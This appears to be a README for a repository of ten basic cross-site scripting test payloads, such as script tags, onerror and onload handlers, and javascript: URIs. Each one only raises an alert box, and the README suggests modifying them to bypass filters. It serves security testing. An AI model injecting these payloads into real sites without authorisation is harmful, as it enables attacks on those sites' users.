## Introduction

Cross-Site Scripting (XSS) is a common vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This repository is a collection of XSS payloads that can be used to test the security of web applications and demonstrate the impact of XSS vulnerabilities.

## Payloads

### 1. Basic Script Alert Payload
```html
<script>alert('XSS');</script>
```
*Classic alert box to test basic XSS vulnerability.*

### 2. Image Tag with Onerror Event
```html
<img src="invalid.jpg" onerror="alert('XSS')">
```
*Exploits the `onerror` event of an image to trigger JavaScript.*

### 3. Anchor Tag with Href Attribute
```html
<a href="javascript:alert('XSS')">Click me</a>
```
*Uses a JavaScript URI in a hyperlink to execute code.*

### 4. SVG with Onload Event
```html
<svg/onload=alert('XSS')>
```
*Injects JavaScript through the onload event of an SVG element.*

### 5. Event Handlers in Any HTML Element
```html
<body onload=alert('XSS')>
```
*Uses `onload` in the body tag to execute JavaScript.*

### 6. Iframe Injection
```html
<iframe src="javascript:alert('XSS')"></iframe>
```
*Uses an iframe with a `src` attribute pointing to a JavaScript payload.*

### 7. Form Action with JavaScript URI
```html
<form action="javascript:alert('XSS')">
  <input type="submit">
</form>
```
*Triggers the payload when the form is submitted.*

### 8. JavaScript in CSS Context
```css
<style>*{xss:expression(alert('XSS'))}</style>
```
*Injects JavaScript through CSS using the deprecated `expression` method.*

### 9. Input Tag with Event Handler
```html
<input type="text" value="XSS" onfocus="alert('XSS')">
```
*Triggers the alert when the input field gains focus.*

### 10. Malicious JavaScript in URL
```html
<a href="http://victim.com?param=<script>alert('XSS')</script>">XSS Link</a>
```
*Injects JavaScript into a query parameter, which may execute if the site improperly handles it.*

## Usage

1. **Clone the Repository:**
   ```bash
   git clone https://github.com/yourusername/xss-payloads.git
   ```
2. **Use the Payloads:**
   * These payloads can be inserted into input fields, URLs, or any location where user input is reflected back in the web application.
   * Use them to test if the application is vulnerable to XSS attacks.

3. **Modify as Needed:**
   * Feel free to modify these payloads to fit specific contexts or bypass filters.

## Contributing

We welcome contributions! If you have a new XSS payload or an improvement to an existing one, feel free to submit a pull request. Please ensure your payloads are well-documented.
